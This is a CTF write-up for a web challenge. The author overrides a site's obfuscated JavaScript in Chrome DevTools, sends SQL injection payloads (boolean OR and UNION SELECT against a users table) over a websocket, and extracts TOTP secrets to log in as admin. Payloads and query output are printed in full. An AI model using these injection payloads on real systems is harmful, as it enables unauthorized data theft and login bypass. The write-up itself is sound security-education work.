---
title: "Overriding JS to Perform SQL Injection (Housecat RTCP CTF Writeup)"
date: 2020-04-26T19:59:05+05:30
draft: false
categories:
 - CTF Writeups
 - Housecat RTCP CTF
tags:
 - web-ctf
 - housecat-rtcp-ctf
---

The TL;DR of this challenge was SQL injection and overriding javascript (to skip the `encrypt`/`decrypt` functions).

## Challenge

Challenge description:

> My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it's secure like he assured me it is?
[Link](http://challs.houseplant.riceteacatpanda.wtf:30003)

## Solution

### JS Overriding

Rule #1 of web CTFs: ALWAYS check robots.txt first! This time I found:
```
User-Agent: *
Disallow: /admin
```

And in [/admin](http://challs.houseplant.riceteacatpanda.wtf:30003/admin) there is a comment saying you need to use TOTP (Time Based OTP. Who does not use a TOTP for 2-factor authentication in 2020?)

Okay, so back to the home page. It was using websockets to fetch blog posts. On Inspect-Elementing/View-Sourcing you find [main.js](http://challs.houseplant.riceteacatpanda.wtf:30003/js/main.js) which is obfuscated. I just used the default Prettifier in Chrome (the `{}` button in Sources tab) to deobfuscate it.

According to the Network tab, the packets were encrypted:
![Encrypted Data](/images/encrypted-network-houseplant.png)

I was going to rewrite the `encrypt` and `decrypt` functions in Python but that would've wasted a lot of time. So I just decided to override JS instead.

You have to enable overriding support first in Google Chrome (no idea about Firefox, I don't use it), and [here is the official guide](https://developers.google.com/web/updates/2018/01/devtools#overrides).

Then, you need to right click on the tab (`main.js` in this case) and you'll see `Save for overrides`. Press that, and you're ready!

While overriding, `console.log()` is your friend. Use it everywhere and see what's happening. I saw a function that decrypted the received data and I added my `console.log()` there:
```
const e = JSON.parse(i.utils.utf8.fromBytes(i.padding.pkcs7.strip(u.decrypt(t))));
console.log(e);
```

Cool! Now it printed everything! Now, I had to modify the sent requests. Just below the above line, there was:
```
if ("success" === e) {
    const t = parseInt(window.location.hash.substr(1));
    if (!isNaN(t))
        return r.send(o.encode(["getPost", t]));
    r.send(o.encode("listPosts"))
    }
}
```

And I found just what I wanted: a method to send data. In this case, it was getting the post ID from the URL, and sending that to get the post. Time for SQL Injection!

### SQL Injection

To ensure I could do a  SQL Injection attack, I made it:
```
r.send(o.encode(["getPost", "1 OR 5=5;--"]));
```

And yes, it worked! I got all the posts on the site. Output of `console.log`:
```
(3) ["post", "1 OR 2=2;--", Array(2)]
0: "post"
1: "1 OR 2=2;--"
2: Array(2)
    0: {id: 1, title: "Welcome to the future!", author: 1, text: "I finally upgraded my blog to use the tech of the …to be truly able to call my blog "futuristic". :/", postDate: 1580857200000, …}
    1: {id: 2, title: "A review of American sockets", author: 1, text: "They're pretty cool, in my opinion.", postDate: 1580947200000, …}
    __proto__: Array(0)
length: 3
__proto__: Array(0)
```

Explanation: I assumed the SQL statement was something like `SELECT * FROM posts WHERE id=<ID HERE>`.
So, my input made it: `SELECT * FROM posts WHERE id=1 OR 5=5;--`. Select everything from table posts where ID is 1 or 5=5 (which evaluates to True), aka fetch all posts. `;--` skips whatever is at the end, and terminates the query.

After that, I used `UNION` to join another `SELECT` query to get user information. In `UNION`, you have to make sure the number of columns match and hence the `1,1` thing:
```
r.send(o.encode(["getPost", "1 OR 2=2 UNION SELECT *,1,1,0 from users;--"]));
```

I didn't find `users` table or `*,1,1,0` on first attempt. It took like 20-30 attempts to get it right.

First I did `UNION SELECT 1,1,1,1,1,1` but that didn't work cause the last variable `hidden` was `1`, and it didn't return that. `UNION SELECT 1,1,1,1,1,0` returned what was expected.
Then I tried to get table names from `information_schema.tables` but that wasn't working. I tried to use some "common" table names and `users` worked. Then I did `UNION SELECT *,0 from users;--`, and kept adding `,1` till it worked. (Remember, `UNION` means same number of columns)

Here was the output:
```
(3) ["post", "1 OR 2=2 UNION SELECT *,1,1,0 from users;--", Array(4)]
0: "post"
1: "1 OR 2=2 UNION SELECT *,1,1,0 from users;--"
2: Array(4)
    0: {id: 1, title: "Welcome to the future!", author: 1, text: "I finally upgraded my blog to use the tech of the …to be truly able to call my blog "futuristic". :/", postDate: 1580857200000, …}
    1: {id: 1, title: "alice", author: "J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ", text: 1, postDate: 1, …}
    2: {id: 2, title: "A review of American sockets", author: 1, text: "They're pretty cool, in my opinion.", postDate: 1580947200000, …}
    3: {id: 2, title: "bob", author: "IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA", text: 1, postDate: 1, …}
    length: 4
    __proto__: Array(0)
length: 3
__proto__: Array(0)
```

I took the TOTP secret key for `bob` and plugged it into a [TOTP Generator](https://totp.danhersam.com/).

On the admin page, I Inspect-Elemented, and uncommented the TOTP input field and deleted password field. After entering the username (`bob`) and the generated TOTP, I was able to log in and get the flag.

## Conclusion

It greatly helps SQL injection if you can create a local SQL table on your end and try creating SQL statements that work.

And, it's sometimes far more efficient to override javascript than to manually simulate requests (using `curl`/`python`) like many beginners do.

Ask me in the comments for any issues! And thanks jammy for the challenge!